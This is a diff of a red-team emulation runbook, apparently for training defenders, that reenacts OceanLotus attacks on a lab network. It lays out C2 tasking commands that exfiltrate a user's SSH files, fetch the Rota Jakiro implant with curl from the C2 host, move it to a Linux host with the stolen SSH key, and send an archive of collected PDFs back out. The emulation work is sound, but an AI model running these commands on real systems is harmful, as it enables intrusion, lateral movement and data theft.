@@ -3,7 +3,7 @@ This scenario emulates OceanLotus TTPs based primarily on two malware specimens 
 used by or associated with the OceanLotus actors:
 
 1. Rota Jakiro
-1. OceanLotus.abcdef
+1. OSX.OceanLotus.abcdef
 
 
 ### 🗺️ Legend
@@ -40,11 +40,11 @@ At the end of this step the Attacker C2 should be listening for the implant call
 ### 👾 Red Team Procedures
 
 #### Kali Setup
-Ensure OceanLotus GitHub repo is cloned to the Kali host and infrastrucre is set up according to the infrastructure.md (This includes ensure the handlers are configured correctly in the `config/handler_config.yml` file and the compiled binary for the control server has been built)
+Ensure OceanLotus GitHub repo is cloned to the Kali host, all payloads are compiled with correct infrastructure information and infrastructure is set up according to the infrastructure.md (This includes ensure the handlers are configured correctly in the `config/handler_config.yml` file and the compiled binary for the control server has been built).
 
-Open **two** terminal windows on your local machine (assuming a macOS or similar terminal)
+Open **four** terminal windows on your local machine (assuming a macOS or similar terminal). Two terminal windows are used for the C2 server, two are used for the AWS macOS instance. 
 
-1. On the first terminal window, ssh to the Kali box hosting our C2 server in AWS
+1. In the **first** terminal window, ssh to the Kali box hosting our C2 server in AWS
    ```
    ssh kali@10.90.30.26
    ```
@@ -54,7 +54,7 @@ Open **two** terminal windows on your local machine (assuming a macOS or similar
    ┌──(kali㉿kali1)-[~]
    └─$
    ```
-1. Start the C2 Server. Navigate to the ocean-lotus folder and execute the control server. 
+1. Start the C2 Server. Navigate to the `controlServer` folder of the ocean-lotus cloned repo and start the C2 server. 
    ```
    cd ocean-lotus/Resources/controlServer
    ```
@@ -78,7 +78,7 @@ Open **two** terminal windows on your local machine (assuming a macOS or similar
    10.90.30.26:443
    ```
    This window is our listener, communications from implants will display in this window. Leave this window open and set to the side.
-1. On the second terminal window, establish a second SSH connection.
+1. In the **second** terminal window, establish a second SSH connection.
    ```
    ssh kali@10.90.30.26
    ```
@@ -107,8 +107,7 @@ Open **two** terminal windows on your local machine (assuming a macOS or similar
 </details>
 
 #### VNC Access to macOS
-Open a new terminal window on your local machine. 
-
+1. Navigate to the **thrid** terminal window on your local machine. 
 1. Setup SSH Tunnel to forward port 5900 to localhost (must use teh ec2-user for this part).
    ```
    ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
@@ -123,14 +122,15 @@ Open a new terminal window on your local machine.
        │ ╰─┼╯ │  Amazon EC2
        └───┴──┘  macOS Catalina 10.15.7
    ```
-1. Open another terminal window on your local machine.
+   Leave this window open and move to the side. We will not need to referene this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion.
+1. Navigate to the **fourth**, and last open terminal window on your local machine.
 1. Copy/Paste the following command to connect over VNC for a GUI intereface for the macOS machine in AWS.
    ```
    open vnc://localhost:5900
    ```
    A window should appear asking for Screen Sharing privillages to sin into "localhost".
-   This terminal window is our live SSH session required for our VNC connect to macOS. Leave this window open and move to the side. We will not need to referene this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion. 
-1.  Enter the Hope Potter's credentials
+   This terminal window can be closed or terminated after the command is run.   
+1. Enter the Hope Potter's credentials
    Username
    ```
    hpotter
@@ -168,7 +168,8 @@ Open a new terminal window on your local machine.
 
 👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it resides on the user's `Downloads` folder. 
 
-The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to OS updates 🙌 🍎) thinking it's a normal document. 
+
+Thinking it's a normal word document, the user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to OS updates 🙌 🍎). 
 
 The implant opens a decoy word document while establishing a connection with the C2 server. 
 
@@ -199,24 +200,24 @@ The implant opens a decoy word document while establishing a connection with the
 
    Expected Output:
    ```
-   [INFO] 2023/08/18 17:08:13 Initial data received from implant:
-   /Users/hpotter/Library/WebKit/
-   1692378529
-   hpotter
-   Mac mini
-   x86_64
-   VISERION.COM10.15.7
-   6-Core Intel Core i73.2 GHz
-   32 GB
-   6-Core Intel Core i7
+      [INFO] 2023/08/18 17:08:13 Initial data received from implant:
+      /Users/hpotter/Library/WebKit/
+      1692378529
+      hpotter
+      Mac mini
+      x86_64
+      VISERION.COM10.15.7
+      6-Core Intel Core i73.2 GHz
+      32 GB
+      6-Core Intel Core i7
    ```
    
 1. The implant will continue to send a `OSX_heartbeat` until tasked.
 
    Expected Output:
    ```
-   [INFO] 2023/08/18 17:17:45 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
-   [INFO] 2023/08/18 17:17:45 No tasks available for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
+      [INFO] 2023/08/18 17:17:45 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
+      [INFO] 2023/08/18 17:17:45 No tasks available for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
    ```
    
  1. Verify the persistence file was dropped by the initial payloads.
@@ -225,34 +226,33 @@ The implant opens a decoy word document while establishing a connection with the
    ```
 
 
-<details><summary>Extra Credit</summary>
-  
-This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon. The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+   <details><summary>Extra Credit</summary>
+     
+      This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon. The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+      
+      Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
+      
+      1. Load the LaunchAgent using `launchctl`
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
+         ````
+      1. List out the processes using the com.apple.launchpad plist
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+         ```
+      1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
+         ```
+      
+      1. Veify we only have one running process using the com.apple.launchpad plist.
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+         ```
+      1. Continue hacking...
 
-Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
-
-1. Load the LaunchAgent using `launchctl`
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
-   ````
-1. List out the processes using the com.apple.launchpad plist
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-   ```
-1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
-   ```
-
-1. Veify we only have one running process using the com.apple.launchpad plist.
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-   ```
-1. Continue hacking...
-
-   
-</details>
-
+   </details>
+<br>
 
 ### 🔮 Reference Code & Reporting
 <details>
@@ -305,6 +305,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    ```zsh
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
    ```
+   
    Expected Output:
    ```
    [SUCCESS] 2023/08/18 18:20:13 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
@@ -322,6 +323,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    
    [SUCCESS] 2023/08/18 18:20:22 Successfully set task output.
    ```
+   
 1. Exfil the Known Host File for review.  
    ```zsh
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
@@ -336,6 +338,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
    [SUCCESS] 2023/08/18 18:29:30 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
    ```
+   
 1. Verify the file was uploaded to the control server.
    ```
    cat ./files/known_hosts
@@ -366,9 +369,9 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    sudo chown -R $(whoami) /usr/local/Cellar
    dscl
    ...
-   [SUCCESS] 2023/08/18 18:36:28 Successfully set task output.
    ```
-   Reviewing the history file, we see they often run admin and file managment commands to a linux server. 
+   
+   Reviewing the history file, we see the user scp commands to the specified IP address. 
 
 ### 🔮 Reference Code & Reporting
 <details>
@@ -400,42 +403,54 @@ Execute Rota Jakiro
 
 ---
 ### 👾 Red Team Procedures
-Task OceanLotus to download Rota Jakiro to the macOS Host
-```
-./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
-```
 
-Verify the file downloaded
-```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
-```
+1. Task OceanLotus to download Rota Jakiro to the macOS Host
+   ```
+   ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
+   ```
 
->If that doesn't work do the following...
->  On the C2 server:
->  ```
->  cd /opt/oceanlotus/Resources/payloads
->  python3 -m http.server
->  ```
->  Task the implant
->  ```
->  ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
->  ```
->  
->  Veify the file downloaded
->  ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
->  ```
+   Veify the file downloaded
+   ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
+   ```
+   
+   <details><summary>Trouble Shooting</summary>
+     On the C2 server:
+     ```
+     cd /opt/oceanlotus/Resources/payloads
+     python3 -m http.server
+     ```
+     Task the implant
+     ```
+     ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+     ```
+     
+     Veify the file downloaded
+     ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
+     ```
+   </details>
 
-Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
-```
-./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
-p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
-```
+1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
+   p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
+   ```
 
-Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
-```
-./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
-```
+1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
+   ```
+1. Confirm C2 Registration of Rota on the C2 Server
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 18:30:29 Received beacon from existing implant 01020304.
+   [INFO] 2023/08/21 18:30:29 No tasks available for UUID:  01020304
+   ```
 
-Confirm C2 Registration of Rota on the C2 Server
+<details><summary>Trouble Shooting</summary>
+   Check to make sure the binary for rota is in the correct location. Handlers will look for payloads to download using the resources/payloads/<my handler name> logic. 
+   
+</details>
+
 
 ### 🔮 Reference Code & Reporting
 <details>
@@ -460,16 +475,21 @@ Confirm C2 Registration of Rota on the C2 Server
 
 ## Step 4 - Discovery on Linux Host
 ### 📖 Overview
-Discover on Linux Host: 
+
 Upload device info
 
 ---
 ### 👾 Red Team Procedures
-```
-./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_dev_info"}'
-```
 
-Confirm device info is printed out
+1. Use Rota Jakiro to collect the device information from the target. 
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_dev_info"}'
+   ```
+   Expected Output:
+   ```
+   [Task] 2023/08/21 18:31:26 drogon-Linux-5.15.0-1040-aws 
+   [SUCCESS] 2023/08/21 18:31:26 Successfully set task output.
+   ```
 
 ### 🔮 Reference Code & Reporting
 <br>
@@ -480,42 +500,98 @@ Confirm device info is printed out
 
 ## Step 5 - Collection
 ### 📖 Overview
-Execute a shared object that includes: 
-create tmp.rota folder 
-move everything into the folder that is a .pdf extension 
-tar all the .pdfs in the folder (exilf.tar.gz)
-Confirm files were created
+Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
+
+Task the implant to upload the shared object (`local_payload_rota.so`) to the target host, the shared object copies and compresses files for collection. 
+
+The following commands are executed by the shared object: 
+- Create a hidden tmp.rota folder 
+- Starting from the $HOME folder, copy files with a .pdf extension into the tmp.rota folder
+- Compress all .pdf files contained in the tmp.rota folder and named `exilf.tar.gz`
+
+Rota Jakiro confirms the target file were created
 
 ---
 ### 👾 Red Team Procedures
-Execute:
 
-run file query command, ensure files & folder exist 
-Confirm: 
-`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`
+1. Upload the shared object onto the Linux host.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "payload.so"}'
+   ```
 
-### 🔮 Reference Code & Reporting
-<br>
-
-### 🔬 Blue Team Notes
-<br>
-
-
+1. Verify the shared object was uploaded to the Linux host. 
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:35:34 Received task output for session:  01020304
+   [Task] 2023/08/21 19:35:34 file exists
+   [SUCCESS] 2023/08/21 19:35:34 Successfully set task output.
+   ```
+1. Execute the Rota Jakiro run_plugin command to execute the shared object.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg": "update"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:36:22 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:36:32 Received task output for session:  01020304
+   [Task] 2023/08/21 19:36:32 Shared Object Executed!
+   [SUCCESS] 2023/08/21 19:36:32 Successfully set task output.
+   ```
+1. Verify the .tar file exsists before exfil.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"/tmp/rota.tar.gz"}'
+   ```
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 19:37:53 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:37:53 Sending new task to implant: 01020304
+   [INFO] 2023/08/21 19:37:53 Received task output for session:  01020304
+   [Task] 2023/08/21 19:37:53 file exists
+   [SUCCESS] 2023/08/21 19:37:53 Successfully set task output.
+   ```
+   
 ## Step 6 - Exfil from Linux Host
 ### 📖 Overview
-Execute another shared object that includes: 
-Uploading the tar file from the folder
+
 
 ---
 ### 👾 Red Team Procedures
-`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
-Confirm upload of file to server 
+
+1. Exfil the `rota.tar.gz` file
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/rota.tar.gz"}'
+   ```
+   NOTE: Payloads exfiled must be 65535 bytes due to limits in buffer size. 
+   Expected Output:
+   ```
+   [SUCCESS] 2023/08/21 19:39:12 Successfully set task for session: 01020304
+   [INFO] 2023/08/21 19:39:14 New task received for UUID:  01020304
+   [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
+   [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
+   ```
+1. Viefity on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
+   ```
+   ls -lart ./files
+   ```
+1. Kill Rota Jakiro and give yourself a high five 🙌, mission accomplished! 💃
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_exit"}'
+   ```
+   Expected Output:
+   ```
+   [Task] 2023/08/21 19:46:47 exiting!
+   [SUCCESS] 2023/08/21 19:46:47 Successfully set task output.
+   ```
+
+The End 💔
 
 ### 🔮 Reference Code & Reporting
 <br>
 
 ### 🔬 Blue Team Notes
 <br>
-
 
 :red_circle: End of Scenario. 
